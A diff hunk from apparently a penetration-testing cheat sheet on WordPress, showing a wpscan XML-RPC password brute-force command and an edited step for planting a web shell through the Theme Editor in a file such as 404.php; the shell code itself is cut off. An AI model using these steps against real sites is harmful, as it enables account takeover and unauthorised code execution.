@@ -1707,7 +1707,7 @@ $ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url <
 - Theme Editor Web Shell
 
 ```
-# Navigate to Appearance -> Theme Editor -> Select an inactive theme
+# Navigate to Appearance -> Theme Editor -> Select an inactive theme -> Select a non-critical file in the Theme Files e.g. 404.php
 
 <?php
 
